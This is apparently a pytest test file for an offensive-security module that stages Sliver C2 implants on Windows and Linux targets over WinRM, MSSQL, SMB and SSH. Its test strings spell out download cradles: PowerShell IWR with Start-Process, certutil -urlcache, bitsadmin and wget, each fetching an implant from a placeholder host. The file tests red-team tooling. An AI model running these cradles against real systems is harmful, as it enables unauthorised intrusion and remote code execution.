        """Test CLEANUP_MODE converts to lowercase: NONE -> none."""
        mock_context.module_options = {"CLEANUP_MODE": "NONE"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.cleanup_mode == "none"

    def test_cleanup_mode_defaults_to_always(self, module_instance, mock_context):
        """Test CLEANUP_MODE defaults to 'always' when not provided."""
        mock_context.module_options = {}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.cleanup_mode == "always"

    def test_staging_download_lowercase(self, module_instance, mock_context):
        """Test STAGING='download' sets staging_mode to 'download'."""
        mock_context.module_options = {"STAGING": "download"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.staging_mode == "download"

    def test_staging_download_uppercase(self, module_instance, mock_context):
        """Test STAGING='DOWNLOAD' (uppercase) converts to 'download'."""
        mock_context.module_options = {"STAGING": "DOWNLOAD"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.staging_mode == "download"

    def test_staging_shellcode_lowercase(self, module_instance, mock_context):
        """Test STAGING='shellcode' sets staging_mode to 'shellcode'."""
        mock_context.module_options = {"STAGING": "shellcode"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.staging_mode == "shellcode"

    def test_staging_shellcode_uppercase(self, module_instance, mock_context):
        """Test STAGING='SHELLCODE' (uppercase) converts to 'shellcode'."""
        mock_context.module_options = {"STAGING": "SHELLCODE"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.staging_mode == "shellcode"

    def test_staging_none_sets_null(self, module_instance, mock_context):
        """Test STAGING='none' sets staging_mode to None."""
        mock_context.module_options = {"STAGING": "none"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.staging_mode is None

    def test_staging_defaults_to_none(self, module_instance, mock_context):
        """Test STAGING defaults to None when not provided."""
        mock_context.module_options = {}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.staging_mode is None

    def test_wait_converts_to_int(self, module_instance, mock_context):
        """Test WAIT converts string to int."""
        mock_context.module_options = {"WAIT": "120"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.wait_seconds == 120
        assert isinstance(module_instance.wait_seconds, int)

    def test_wait_defaults_to_90(self, module_instance, mock_context):
        """Test WAIT defaults to 90 seconds when not provided."""
        mock_context.module_options = {}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.wait_seconds == 90

    def test_beacon_interval_converts_to_int(self, module_instance, mock_context):
        """Test BEACON_INTERVAL converts string to int."""
        mock_context.module_options = {"BEACON_INTERVAL": "10"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.beacon_interval == 10
        assert isinstance(module_instance.beacon_interval, int)

    def test_beacon_interval_defaults_to_5(self, module_instance, mock_context):
        """Test BEACON_INTERVAL defaults to 5 seconds when not provided."""
        mock_context.module_options = {}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.beacon_interval == 5

    def test_beacon_jitter_converts_to_int(self, module_instance, mock_context):
        """Test BEACON_JITTER converts string to int."""
        mock_context.module_options = {"BEACON_JITTER": "7"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.beacon_jitter == 7
        assert isinstance(module_instance.beacon_jitter, int)

    def test_beacon_jitter_defaults_to_3(self, module_instance, mock_context):
        """Test BEACON_JITTER defaults to 3 seconds when not provided."""
        mock_context.module_options = {}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.beacon_jitter == 3

    def test_http_staging_port_converts_to_int(self, module_instance, mock_context):
        """Test HTTP_STAGING_PORT converts string to int in download mode."""
        mock_context.module_options = {"STAGING": "download", "RHOST": "10.0.0.1", "HTTP_STAGING_PORT": "9999"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.http_staging_port == 9999
        assert isinstance(module_instance.http_staging_port, int)

    def test_http_staging_port_defaults_to_8080(self, module_instance, mock_context):
        """Test HTTP_STAGING_PORT defaults to 8080 in download mode."""
        mock_context.module_options = {"STAGING": "download", "RHOST": "10.0.0.1"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.http_staging_port == 8080

    def test_download_tool_lowercase_conversion(self, module_instance, mock_context):
        """Test DOWNLOAD_TOOL converts to lowercase."""
        mock_context.module_options = {"STAGING": "download", "RHOST": "10.0.0.1", "DOWNLOAD_TOOL": "CERTUTIL"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.download_tool == "certutil"

    def test_download_tool_defaults_to_powershell(self, module_instance, mock_context):
        """Test DOWNLOAD_TOOL defaults to 'powershell' in download mode."""
        mock_context.module_options = {"STAGING": "download", "RHOST": "10.0.0.1"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.download_tool == "powershell"

    def test_shellcode_listener_host_defaults_to_rhost(self, module_instance, mock_context):
        """Test SHELLCODE_LISTENER_HOST defaults to RHOST in shellcode mode."""
        mock_context.module_options = {"STAGING": "shellcode", "RHOST": "10.0.0.1"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.shellcode_listener_host == "10.0.0.1"

    def test_shellcode_listener_host_from_options(self, module_instance, mock_context):
        """Test SHELLCODE_LISTENER_HOST can be explicitly set."""
        mock_context.module_options = {
            "STAGING": "shellcode",
            "RHOST": "10.0.0.1",
            "SHELLCODE_LISTENER_HOST": "192.168.1.100",
        }
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.shellcode_listener_host == "192.168.1.100"

    def test_shellcode_listener_port_converts_to_int(self, module_instance, mock_context):
        """Test SHELLCODE_LISTENER_PORT converts string to int in shellcode mode."""
        mock_context.module_options = {
            "STAGING": "shellcode",
            "RHOST": "10.0.0.1",
            "SHELLCODE_LISTENER_PORT": "9090",
        }
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.shellcode_listener_port == 9090
        assert isinstance(module_instance.shellcode_listener_port, int)

    def test_shellcode_listener_port_defaults_to_rport(self, module_instance, mock_context):
        """Test SHELLCODE_LISTENER_PORT defaults to RPORT in shellcode mode."""
        mock_context.module_options = {"STAGING": "shellcode", "RHOST": "10.0.0.1", "RPORT": "8443"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.shellcode_listener_port == 8443

    def test_shellcode_protocol_lowercase_conversion(self, module_instance, mock_context):
        """Test SHELLCODE_PROTOCOL converts to lowercase."""
        mock_context.module_options = {
            "STAGING": "shellcode",
            "RHOST": "10.0.0.1",
            "SHELLCODE_PROTOCOL": "HTTPS",
        }
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.shellcode_protocol == "https"

    def test_shellcode_protocol_defaults_to_http(self, module_instance, mock_context):
        """Test SHELLCODE_PROTOCOL defaults to 'http' in shellcode mode."""
        mock_context.module_options = {"STAGING": "shellcode", "RHOST": "10.0.0.1"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.shellcode_protocol == "http"

    def test_format_exe_sets_executable(self, module_instance, mock_context):
        """Test FORMAT='exe' sets format to EXECUTABLE and extension to exe."""
        mock_context.module_options = {"FORMAT": "exe"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.format == "EXECUTABLE"
        assert module_instance.extension == "exe"

    def test_format_executable_sets_executable(self, module_instance, mock_context):
        """Test FORMAT='executable' sets format to EXECUTABLE and extension to exe."""
        mock_context.module_options = {"FORMAT": "executable"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.format == "EXECUTABLE"
        assert module_instance.extension == "exe"

    def test_format_invalid_raises(self, module_instance, mock_context):
        """Test invalid FORMAT raises ModuleValidationError."""
        mock_context.module_options = {"FORMAT": "dll"}
        with pytest.raises(ModuleValidationError, match="Invalid FORMAT"):
            module_instance._parse_module_options(mock_context, mock_context.module_options)

    def test_format_defaults_to_executable(self, module_instance, mock_context):
        """Test FORMAT defaults to EXECUTABLE when not provided."""
        mock_context.module_options = {}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.format == "EXECUTABLE"
        assert module_instance.extension == "exe"

    def test_implant_base_path_warning_for_nonexistent_path(self, module_instance, mock_context, caplog):
        """Test warning logged when IMPLANT_BASE_PATH does not exist."""
        import logging

        mock_context.module_options = {"IMPLANT_BASE_PATH": "/nonexistent/path"}
        with caplog.at_level(logging.WARNING):
            module_instance._parse_module_options(mock_context, mock_context.module_options)
        mock_context.log.warning.assert_called_once()
        assert "does not exist locally" in mock_context.log.warning.call_args[0][0]

    def test_implant_base_path_defaults_to_tmp(self, module_instance, mock_context):
        """Test IMPLANT_BASE_PATH defaults to /tmp when not provided."""
        mock_context.module_options = {}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.implant_base_path == "/tmp"

    def test_os_arch_share_parsing(self, module_instance, mock_context):
        """Test OS, ARCH, and SHARE options are parsed correctly."""
        mock_context.module_options = {"OS": "windows", "ARCH": "amd64", "SHARE": "C$"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.os_type == "windows"
        assert module_instance.arch == "amd64"
        assert module_instance.share_config == "C$"

    def test_profile_parsing_and_display(self, module_instance, mock_context):
        """Test PROFILE option is parsed and displayed."""
        mock_context.module_options = {"PROFILE": "my_custom_profile"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        assert module_instance.profile == "my_custom_profile"
        mock_context.log.display.assert_any_call("Using Sliver profile: my_custom_profile")

    def test_option_with_leading_whitespace_not_stripped(self, module_instance, mock_context):
        """Test RHOST with leading whitespace is NOT stripped by parser (passed as-is)."""
        mock_context.module_options = {"RHOST": "  10.0.0.1"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        # Production code doesn't strip whitespace (line 954: module_options.get("RHOST", None))
        assert module_instance.rhost == "  10.0.0.1"

    def test_option_with_trailing_whitespace_not_stripped(self, module_instance, mock_context):
        """Test RHOST with trailing whitespace is NOT stripped by parser (passed as-is)."""
        mock_context.module_options = {"RHOST": "10.0.0.1  "}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        # Production code doesn't strip whitespace
        assert module_instance.rhost == "10.0.0.1  "

    def test_cleanup_mode_with_lowercase_true_normalized(self, module_instance, mock_context):
        """Test CLEANUP_MODE with lowercase 'always' is normalized correctly."""
        mock_context.module_options = {"CLEANUP_MODE": "Always"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        # Production code uses .lower() normalization (line 961)
        assert module_instance.cleanup_mode == "always"

    def test_rport_with_leading_zeros_parsed_correctly(self, module_instance, mock_context):
        """Test RPORT with leading zeros like '0443' is parsed correctly as 443."""
        mock_context.module_options = {"RHOST": "10.0.0.1", "RPORT": "0443"}
        module_instance._parse_module_options(mock_context, mock_context.module_options)
        # Python's int() handles leading zeros: int("0443") == 443 (line 956)
        assert module_instance.rport == 443
        assert isinstance(module_instance.rport, int)


class TestDetectOsArch:
    """Additional tests for _detect_os_arch to improve mutation kill rate."""

    def test_windows_10_detection(self, module_instance, mock_context, mock_connection):
        mock_connection.server_os = "Windows 10 Pro"
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert os_type == "windows"

    def test_arch_x64_normalized(self, module_instance, mock_context, mock_connection):
        mock_connection.server_os = "Windows"
        mock_connection.os_arch = "x64"
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert arch == "amd64"

    def test_arch_x86_64_normalized(self, module_instance, mock_context, mock_connection):
        mock_connection.server_os = "Linux"
        mock_connection.os_arch = "x86_64"
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert arch == "amd64"

    def test_arch_i386_normalized(self, module_instance, mock_context, mock_connection):
        mock_connection.server_os = "Windows"
        mock_connection.os_arch = "i386"
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert arch == "386"

    def test_arch_aarch64_normalized(self, module_instance, mock_context, mock_connection):
        mock_connection.server_os = "Linux"
        mock_connection.os_arch = "aarch64"
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert arch == "amd64"  # Unknown architectures default to amd64

    def test_os_from_options_override(self, module_instance, mock_context, mock_connection):
        mock_connection.server_os = "Windows"
        module_instance.os_type = "linux"
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert os_type == "linux"

    def test_arch_from_options_override(self, module_instance, mock_context, mock_connection):
        mock_connection.server_os = "Windows"
        mock_connection.os_arch = "x64"
        module_instance.arch = "386"
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert arch == "386"
        mock_context.log.display.assert_called_with("Using specified arch: 386")

    def test_connection_os_none_with_no_override_raises(self, module_instance, mock_context, mock_connection):
        mock_connection.server_os = None
        module_instance.os_type = None
        with pytest.raises(ModuleValidationError, match="Could not detect OS"):
            module_instance._detect_os_arch(mock_context, mock_connection)
        mock_context.log.fail.assert_called_with("Could not detect OS. Use -o OS=windows|linux")

    def test_connection_os_empty_with_no_override_raises(self, module_instance, mock_context, mock_connection):
        mock_connection.server_os = ""
        module_instance.os_type = None
        with pytest.raises(ModuleValidationError, match="Could not detect OS"):
            module_instance._detect_os_arch(mock_context, mock_connection)
        mock_context.log.fail.assert_called_with("Could not detect OS. Use -o OS=windows|linux")

    def test_connection_os_whitespace_only_raises(self, module_instance, mock_context, mock_connection):
        mock_connection.server_os = "   "
        module_instance.os_type = None
        with pytest.raises(ModuleValidationError, match="Unsupported OS detected"):
            module_instance._detect_os_arch(mock_context, mock_connection)
        mock_context.log.fail.assert_called_with("Unsupported OS:    ")

    def test_arch_empty_string_defaults_to_amd64(self, module_instance, mock_context, mock_connection):
        mock_connection.server_os = "Windows"
        mock_connection.os_arch = ""
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert arch == "amd64"

    def test_arch_whitespace_only_defaults_to_amd64(self, module_instance, mock_context, mock_connection):
        mock_connection.server_os = "Linux"
        mock_connection.os_arch = "   "
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert arch == "amd64"

    def test_os_detection_case_insensitive(self, module_instance, mock_context, mock_connection):
        # Test uppercase WINDOWS
        mock_connection.server_os = "WINDOWS"
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert os_type == "windows"

        # Test lowercase windows
        mock_connection.server_os = "windows"
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert os_type == "windows"

        # Test mixed case WiNdOwS
        mock_connection.server_os = "WiNdOwS"
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert os_type == "windows"

    def test_unix_with_trailing_whitespace_detects_linux(self, module_instance, mock_context, mock_connection):
        mock_connection.server_os = "Unix  "
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert os_type == "linux"


class TestExecuteStagedCommand:
    """Comprehensive tests for _execute_staged_command method (lines 1376-1452)."""

    # ===== WinRM Protocol Tests =====

    def test_winrm_powershell_uses_ps_execute(self, module_instance, mock_context, mock_connection):
        """Test WinRM with PowerShell download tool uses ps_execute with inner command."""
        module_instance.download_tool = "powershell"
        download_url = "http://10.0.0.1:8080/implant.exe"
        implant_name = "test_implant.exe"
        mock_handler = Mock()

        module_instance._execute_staged_command(
            mock_context,
            mock_connection,
            "winrm",
            "dummy_outer_cmd",  # Not used for PowerShell
            "windows",
            mock_handler,
            download_url=download_url,
            implant_name=implant_name,
        )

        # Verify ps_execute called with inner PowerShell command
        expected_ps = (
            f"IWR '{download_url}' -OutFile $env:TEMP\\{implant_name}; Start-Process $env:TEMP\\{implant_name}"
        )
        mock_connection.ps_execute.assert_called_once_with(expected_ps, get_output=True)
        mock_connection.execute.assert_not_called()

    def test_winrm_powershell_logs_output_when_present(self, module_instance, mock_context, mock_connection):
        """Test WinRM PowerShell logs debug output when result is non-empty."""
        module_instance.download_tool = "powershell"
        mock_connection.ps_execute.return_value = "Some PowerShell output"
        mock_handler = Mock()

        module_instance._execute_staged_command(
            mock_context,
            mock_connection,
            "winrm",
            "dummy_cmd",
            "windows",
            mock_handler,
            download_url="http://10.0.0.1:8080/test.exe",
            implant_name="test.exe",
        )

        mock_context.log.debug.assert_called_with("PowerShell output: Some PowerShell output")

    def test_winrm_powershell_no_log_when_empty_output(self, module_instance, mock_context, mock_connection):
        """Test WinRM PowerShell does not log when output is empty or whitespace."""
        module_instance.download_tool = "powershell"
        mock_connection.ps_execute.return_value = "   "
        mock_handler = Mock()

        module_instance._execute_staged_command(
            mock_context,
            mock_connection,
            "winrm",
            "dummy_cmd",
            "windows",
            mock_handler,
            download_url="http://10.0.0.1:8080/test.exe",
            implant_name="test.exe",
        )

        # Should not call debug log for empty/whitespace output
        debug_calls = [call for call in mock_context.log.debug.call_args_list if "PowerShell output:" in str(call)]
        assert len(debug_calls) == 0

    def test_winrm_certutil_uses_execute(self, module_instance, mock_context, mock_connection):
        """Test WinRM with certutil download tool uses connection.execute."""
        module_instance.download_tool = "certutil"
        cmd = "certutil -urlcache -f http://10.0.0.1:8080/test.exe C:\\temp\\test.exe"
        mock_handler = Mock()

        module_instance._execute_staged_command(mock_context, mock_connection, "winrm", cmd, "windows", mock_handler)

        mock_connection.execute.assert_called_once_with(cmd)
        mock_connection.ps_execute.assert_not_called()

    def test_winrm_bitsadmin_uses_execute(self, module_instance, mock_context, mock_connection):
        """Test WinRM with bitsadmin download tool uses connection.execute."""
        module_instance.download_tool = "bitsadmin"
        cmd = "bitsadmin /transfer job http://10.0.0.1:8080/test.exe C:\\temp\\test.exe"
        mock_handler = Mock()

        module_instance._execute_staged_command(mock_context, mock_connection, "winrm", cmd, "windows", mock_handler)

        mock_connection.execute.assert_called_once_with(cmd)
        mock_connection.ps_execute.assert_not_called()

    # ===== MSSQL Protocol Tests =====

    def test_mssql_rejects_wget_tool(self, module_instance, mock_context, mock_connection):
        """Test MSSQL with wget raises ModuleValidationError with specific message."""
        module_instance.download_tool = "wget"
        mock_handler = Mock()

        with pytest.raises(ModuleValidationError, match="Invalid download tool for MSSQL"):
            module_instance._execute_staged_command(
                mock_context, mock_connection, "mssql", "dummy_cmd", "windows", mock_handler
            )

        mock_context.log.fail.assert_called_with("Download tool 'wget' not supported for MSSQL (Windows-only protocol)")

    def test_mssql_rejects_curl_tool(self, module_instance, mock_context, mock_connection):
        """Test MSSQL with curl raises ModuleValidationError with specific message."""
        module_instance.download_tool = "curl"
        mock_handler = Mock()

        with pytest.raises(ModuleValidationError, match="Invalid download tool for MSSQL"):
            module_instance._execute_staged_command(
                mock_context, mock_connection, "mssql", "dummy_cmd", "windows", mock_handler
            )

        mock_context.log.fail.assert_called_with("Download tool 'curl' not supported for MSSQL (Windows-only protocol)")

    def test_mssql_rejects_python_tool(self, module_instance, mock_context, mock_connection):
        """Test MSSQL with python raises ModuleValidationError with specific message."""
        module_instance.download_tool = "python"
        mock_handler = Mock()

        with pytest.raises(ModuleValidationError, match="Invalid download tool for MSSQL"):
            module_instance._execute_staged_command(
                mock_context, mock_connection, "mssql", "dummy_cmd", "windows", mock_handler
            )

        mock_context.log.fail.assert_called_with(
            "Download tool 'python' not supported for MSSQL (Windows-only protocol)"
        )

    def test_mssql_increases_socket_timeout_to_120s(self, module_instance, mock_context, mock_connection):
        """Test MSSQL increases socket timeout to 120s for large downloads."""
        module_instance.download_tool = "powershell"
        mock_handler = Mock()

        # Mock socket with gettimeout/settimeout
        mock_socket = Mock()
        mock_socket.gettimeout.return_value = 30  # Original timeout
        mock_connection.conn.socket = mock_socket

        cmd = "powershell IWR ..."
        module_instance._execute_staged_command(mock_context, mock_connection, "mssql", cmd, "windows", mock_handler)

        # Verify timeout was increased to 120s
        mock_socket.settimeout.assert_any_call(120)
        mock_context.log.debug.assert_any_call("Increased socket timeout to 120s for download operation")

    def test_mssql_restores_original_timeout_after_execute(self, module_instance, mock_context, mock_connection):
        """Test MSSQL restores original socket timeout in finally block."""
        module_instance.download_tool = "certutil"
        mock_handler = Mock()

        # Mock socket with original timeout
        mock_socket = Mock()
        mock_socket.gettimeout.return_value = 45
        mock_connection.conn.socket = mock_socket

        cmd = "certutil -urlcache ..."
        module_instance._execute_staged_command(mock_context, mock_connection, "mssql", cmd, "windows", mock_handler)

        # Verify timeout was restored
        calls = mock_socket.settimeout.call_args_list
        assert len(calls) == 2
        assert calls[0][0][0] == 120  # Increased to 120
        assert calls[1][0][0] == 45  # Restored to 45

    def test_mssql_executes_command_and_logs_success(self, module_instance, mock_context, mock_connection):
        """Test MSSQL executes command and logs info message."""
        module_instance.download_tool = "bitsadmin"
        mock_handler = Mock()

        # Mock socket
        mock_socket = Mock()
        mock_socket.gettimeout.return_value = 30
        mock_connection.conn.socket = mock_socket

        cmd = "bitsadmin /transfer job ..."
        module_instance._execute_staged_command(mock_context, mock_connection, "mssql", cmd, "windows", mock_handler)

        mock_connection.execute.assert_called_once_with(cmd)
        mock_context.log.info.assert_any_call("Download cradle executed via MSSQL (xp_cmdshell)")

    def test_mssql_handles_missing_socket_gracefully(self, module_instance, mock_context, mock_connection):
        """Test MSSQL handles missing socket attribute without error."""
        module_instance.download_tool = "certutil"
        mock_handler = Mock()

        # Connection without socket attribute
        mock_connection.conn.socket = None

        cmd = "certutil -urlcache ..."
        # Should not raise exception
        module_instance._execute_staged_command(mock_context, mock_connection, "mssql", cmd, "windows", mock_handler)

        mock_connection.execute.assert_called_once_with(cmd)

    def test_mssql_ignores_timeout_restore_errors(self, module_instance, mock_context, mock_connection):
        """Test MSSQL ignores AttributeError/OSError when restoring timeout."""
        module_instance.download_tool = "powershell"
        mock_handler = Mock()

        # Mock socket that raises error on second settimeout
        mock_socket = Mock()
        mock_socket.gettimeout.return_value = 30
        mock_socket.settimeout.side_effect = [None, OSError("Socket closed")]
        mock_connection.conn.socket = mock_socket

        cmd = "powershell IWR ..."
        # Should not raise exception
        module_instance._execute_staged_command(mock_context, mock_connection, "mssql", cmd, "windows", mock_handler)

        mock_connection.execute.assert_called_once_with(cmd)

    # ===== SMB Protocol Tests =====

    def test_smb_rejects_wget_tool_with_specific_messages(self, module_instance, mock_context, mock_connection):
        """Test SMB with wget raises ModuleValidationError with two specific log messages."""
        module_instance.download_tool = "wget"
        mock_handler = Mock()

        with pytest.raises(ModuleValidationError, match="Invalid download tool for SMB"):
            module_instance._execute_staged_command(
                mock_context, mock_connection, "smb", "dummy_cmd", "windows", mock_handler
            )

        # Verify both log.fail calls
        assert mock_context.log.fail.call_count == 2
        calls = [str(call) for call in mock_context.log.fail.call_args_list]
        assert any("Download tool 'wget' not supported for SMB staging (Windows-only)" in call for call in calls)
        assert any(
            "Use STAGING=none for Linux/Samba targets, or use powershell/certutil/bitsadmin" in call for call in calls
        )

    def test_smb_rejects_curl_tool_with_specific_messages(self, module_instance, mock_context, mock_connection):
        """Test SMB with curl raises ModuleValidationError with two specific log messages."""
        module_instance.download_tool = "curl"
        mock_handler = Mock()

        with pytest.raises(ModuleValidationError, match="Invalid download tool for SMB"):
            module_instance._execute_staged_command(
                mock_context, mock_connection, "smb", "dummy_cmd", "windows", mock_handler
            )

        # Verify both log.fail calls
        assert mock_context.log.fail.call_count == 2
        calls = [str(call) for call in mock_context.log.fail.call_args_list]
        assert any("Download tool 'curl' not supported for SMB staging (Windows-only)" in call for call in calls)
        assert any(
            "Use STAGING=none for Linux/Samba targets, or use powershell/certutil/bitsadmin" in call for call in calls
        )

    def test_smb_rejects_python_tool_with_specific_messages(self, module_instance, mock_context, mock_connection):
        """Test SMB with python raises ModuleValidationError with two specific log messages."""
        module_instance.download_tool = "python"
        mock_handler = Mock()

        with pytest.raises(ModuleValidationError, match="Invalid download tool for SMB"):
            module_instance._execute_staged_command(
                mock_context, mock_connection, "smb", "dummy_cmd", "windows", mock_handler
            )

        # Verify both log.fail calls
        assert mock_context.log.fail.call_count == 2
        calls = [str(call) for call in mock_context.log.fail.call_args_list]
        assert any("Download tool 'python' not supported for SMB staging (Windows-only)" in call for call in calls)
        assert any(
            "Use STAGING=none for Linux/Samba targets, or use powershell/certutil/bitsadmin" in call for call in calls
        )

    def test_smb_rejects_linux_target_with_specific_messages(self, module_instance, mock_context, mock_connection):
        """Test SMB with Linux target raises ModuleValidationError with two specific log messages."""
        module_instance.download_tool = "powershell"
        mock_handler = Mock()

        with pytest.raises(ModuleValidationError, match="SMB staging requires Windows target"):
            module_instance._execute_staged_command(
                mock_context,
                mock_connection,
                "smb",
                "dummy_cmd",
                "linux",  # Linux target
                mock_handler,
            )

        # Verify both log.fail calls
        assert mock_context.log.fail.call_count == 2
        calls = [str(call) for call in mock_context.log.fail.call_args_list]
        assert any("SMB HTTP staging only supported for Windows targets" in call for call in calls)
        assert any("Use STAGING=none for Linux/Samba targets" in call for call in calls)

    def test_smb_uses_smbexec_method_with_powershell(self, module_instance, mock_context, mock_connection):
        """Test SMB uses connection.execute with methods=['smbexec'] for PowerShell."""
        module_instance.download_tool = "powershell"
        cmd = "powershell IWR 'http://10.0.0.1:8080/test.exe' -OutFile C:\\temp\\test.exe"
        mock_handler = Mock()

        module_instance._execute_staged_command(mock_context, mock_connection, "smb", cmd, "windows", mock_handler)

        mock_connection.execute.assert_called_once_with(cmd, methods=["smbexec"])
        mock_context.log.info.assert_any_call("Download cradle executed via SMB (smbexec)")

    def test_smb_uses_smbexec_method_with_certutil(self, module_instance, mock_context, mock_connection):
        """Test SMB uses connection.execute with methods=['smbexec'] for certutil."""
        module_instance.download_tool = "certutil"
        cmd = "certutil -urlcache -f http://10.0.0.1:8080/test.exe C:\\temp\\test.exe"
        mock_handler = Mock()

        module_instance._execute_staged_command(mock_context, mock_connection, "smb", cmd, "windows", mock_handler)

        mock_connection.execute.assert_called_once_with(cmd, methods=["smbexec"])
        mock_context.log.info.assert_any_call("Download cradle executed via SMB (smbexec)")

    def test_smb_uses_smbexec_method_with_bitsadmin(self, module_instance, mock_context, mock_connection):
        """Test SMB uses connection.execute with methods=['smbexec'] for bitsadmin."""
        module_instance.download_tool = "bitsadmin"
        cmd = "bitsadmin /transfer job http://10.0.0.1:8080/test.exe C:\\temp\\test.exe"
        mock_handler = Mock()

        module_instance._execute_staged_command(mock_context, mock_connection, "smb", cmd, "windows", mock_handler)

        mock_connection.execute.assert_called_once_with(cmd, methods=["smbexec"])
        mock_context.log.info.assert_any_call("Download cradle executed via SMB (smbexec)")

    # ===== SSH Protocol Tests =====

    def test_ssh_uses_handler_execute(self, module_instance, mock_context, mock_connection):
        """Test SSH protocol uses handler.execute method."""
        module_instance.download_tool = "wget"
        cmd = "wget http://10.0.0.1:8080/test.elf -O /tmp/test.elf"
        mock_handler = Mock()

        module_instance._execute_staged_command(mock_context, mock_connection, "ssh", cmd, "linux", mock_handler)

        mock_handler.execute.assert_called_once_with(mock_context, mock_connection, cmd, "linux")
        mock_connection.execute.assert_not_called()

    def test_rdp_protocol_uses_handler_execute(self, module_instance, mock_context, mock_connection):
        """Test RDP protocol (other protocol) uses handler.execute method."""
        module_instance.download_tool = "powershell"
        cmd = "powershell IWR ..."
        mock_handler = Mock()

        module_instance._execute_staged_command(mock_context, mock_connection, "rdp", cmd, "windows", mock_handler)

        mock_handler.execute.assert_called_once_with(mock_context, mock_connection, cmd, "windows")
        mock_connection.execute.assert_not_called()

    # ===== Common Logging Tests =====

    def test_all_protocols_log_final_success_message(self, module_instance, mock_context, mock_connection):
        """Test all protocols log final success message with host."""
        module_instance.download_tool = "powershell"
        mock_connection.host = "10.10.10.50"
        mock_handler = Mock()

        # Test each protocol
        protocols_and_os = [("winrm", "windows"), ("mssql", "windows"), ("smb", "windows"), ("ssh", "linux")]

        for protocol, os_type in protocols_and_os:
            mock_context.log.info.reset_mock()

            # Setup for MSSQL socket
            if protocol == "mssql":
                mock_socket = Mock()
                mock_socket.gettimeout.return_value = 30
                mock_connection.conn.socket = mock_socket

            module_instance._execute_staged_command(
                mock_context,
                mock_connection,
                protocol,
                "dummy_cmd",
                os_type,
                mock_handler,
                download_url="http://test.com/test.exe" if protocol == "winrm" else None,
                implant_name="test.exe" if protocol == "winrm" else None,
            )

            # All protocols should log this final message
            mock_context.log.info.assert_any_call(f"Download cradle executed on {mock_connection.host}")


class TestRunBeacon:
    """Tests for _run_beacon method to improve mutation kill rate.

    This method has ~134 untested mutants. Tests cover:
    - Error paths (config_path not set)
    - Staging mode: none (default upload/execute)
    - Staging mode: download (HTTP staging)
    - Staging mode: shellcode (WinRM-only, stager listeners)
    - Protocol auto-configuration (MSSQL, SMB)
    - Cleanup integration
    - Finally block (local temp cleanup)
    """

    @pytest.fixture
    def mock_run_beacon_deps(self, module_instance):
        """Mock all dependencies for _run_beacon testing."""
        deps = {
            "detect_os_arch": Mock(return_value=("windows", "amd64")),
            "generate_implant_name": Mock(return_value="test_implant.exe"),
            "get_handler": Mock(),
            "build_ic_default": Mock(return_value=(Mock(), "default_profile")),
            "build_ic_from_profile": Mock(return_value=(Mock(), "test_profile")),
            "generate_implant": Mock(return_value=b"implant_bytes"),
            "save_temp": Mock(return_value="/tmp/test_implant.exe"),
            "wait_cleanup": Mock(),
            "cleanup_local": Mock(),
            "run_staged_http": Mock(return_value=("/remote/path", "job_123", "site_456")),
            "get_worker": Mock(return_value=Mock()),
            "generate_stager": Mock(return_value=b"stager_data"),
            "worker_submit": Mock(),
        }

        # Assign mocks to module instance
        module_instance._detect_os_arch = deps["detect_os_arch"]
        module_instance._generate_implant_name = deps["generate_implant_name"]
        module_instance.get_handler = deps["get_handler"]
        module_instance._build_ic_default = deps["build_ic_default"]
        module_instance._build_ic_from_profile = deps["build_ic_from_profile"]
        module_instance._generate_sliver_implant = deps["generate_implant"]
        module_instance._save_implant_to_temp = deps["save_temp"]
        module_instance._wait_for_beacon_and_cleanup = deps["wait_cleanup"]
